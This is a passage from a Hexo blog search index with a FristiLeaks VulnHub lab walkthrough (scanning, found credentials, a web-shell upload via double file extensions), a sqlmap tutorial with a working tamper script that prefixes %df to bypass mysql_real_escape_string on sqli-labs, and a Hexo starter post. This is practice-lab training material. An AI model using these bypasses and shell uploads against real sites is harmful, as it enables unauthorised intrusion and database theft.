    <content type="text"><![CDATA[A small VM made for a Dutch informal hacker meetup called Fristileaks. Meant to be broken in a few hours without requiring debuggers, reverse engineering, etc.. 0x01 开始前的准备环境下载https://download.vulnhub.com/fristileaks/FristiLeaks_1.3.ova.torrenthttps://download.vulnhub.com/fristileaks/FristiLeaks_1.3.ova 配置环境VMware users will need to manually edit the VM’s MAC address to: 08:00:27:A5:A6:76也就是把VMware的MAC地址调为08:00:27:A5:A6:76，之后开启虚拟机即可 0x02 扫描首先使用Nmap进行扫描 只有80端口开启，nmap扫描下80端口 可以看到robots文件存在，并有三个目录存在 访问192.168.1.5，除了一张图片，基本上没有什么了 robots.txt里的三个页面打开后是同一张图片，看来是毫无用处了，用御剑扫了下目录发现images文件夹,基本没用 0x03 获得Shell最后回到主页的图片上来，fristi，题目好像也有这个，于是试了下fristi 弱口令失败，看下源代码想找找有没有什么东西 Great 先将base64解码，出现PNG字样，用base64转图片 得到一串字符，尝试登陆： 正好第一处tip中有个名字，尝试登陆 进入上传页面 在namp扫描时发现服务器为Apache Linux所以尝试下多重后缀名 上传成功，用菜刀连接 0x04 提升权限正在骑马赶来的路上……]]></content>
      <categories>
        <category>Challenge</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqlmap --tamper脚本编写]]></title>
    <url>%2F2018%2F10%2F01%2Fsqlmap-tamper%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99%2F</url>
    <content type="text"><![CDATA[工欲善其事,必先利其器 0x01 tamper脚本在没有WAF的情况下使用Sqlmap注入网站基本上是无往不利，但是WAF的存在使得注入变得艰难，而tamper脚本可以在大多数情况下完成自动化注入 0x02 tamper脚本分析本文仅选择lowercase.py进行分析 123456789101112131415161718192021222324252627282930313233343536373839404142434445#!/usr/bin/env python"""Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)See the file 'LICENSE' for copying permission"""import refrom lib.core.data import kb #导入sqlmap中lib\core\data中的kb函数，测试 SQL 注入的过程中，使用的配置文件事先全部被加载到了 conf 和 kbfrom lib.core.enums import PRIORITY#导入sqlmap中lib\core\enums中的PRIORITY函数， LOWEST = -100，LOWER = -50，. 详细见enums.py__priority__ = PRIORITY.NORMAL#定义优先级为一般def dependencies(): passdef tamper(payload, **kwargs):#定义tamper脚本，payload, **kwargs 为定义的参数，其中**kwargs为字典存储，类似于 &#123;'a': 1, 'c': 3, 'b': 2&#125; """ Replaces each keyword character with lower case value Tested against: * Microsoft SQL Server 2005 * MySQL 4, 5.0 and 5.5 * Oracle 10g * PostgreSQL 8.3, 8.4, 9.0 Notes: * Useful to bypass very weak and bespoke web application firewalls that has poorly written permissive regular expressions &gt;&gt;&gt; tamper('INSERT') 'insert' """ retVal = payload if payload: for match in re.finditer(r"\b[A-Za-z_]+\b", retVal): word = match.group()#循环遍历每个单词 if word.upper() in kb.keywords:#如果是SQL中的关键词则替换为小写 retVal = retVal.replace(word, word.lower()) return retVal#返回替换后的payload 0x03 编写tamper脚本sqli-labs第36关 Bypass MYSQL_real_escape_string,绕过mysql_real_escape_string的方法本文不再累述,编写一个tamper脚本，使得payload中第一个单引号前加上%df 123456789101112131415161718192021222324252627282930313233343536373839#!/usr/bin/env python#coding:utf-8"""Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)See the file 'LICENSE' for copying permission"""from lib.core.data import kbfrom lib.core.enums import PRIORITY__priority__ = PRIORITY.NORMALdef dependencies(): passdef tamper(payload, **kwargs): """ Tested against: * MySQL * gbk,mysql_real_escape_string &gt;&gt;&gt; tamper('1' and sleep(10) ') '1%df' and sleep(10)' """ retVal = "" if payload: first = False for i in payload: if i == '\'' and not first: retVal += '%df\'' first = True else: retVal += i return retVal 0x04 使用tamper脚本测试下脚本是否给力 1python2 .\sqlmap.py -u "http://localhost/sqli-labs/Less-36/?id=1" --tamper=gbk.py --dbs]]></content>
      <categories>
        <category>Code</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2018%2F09%2F27%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
  </entry>
</search>
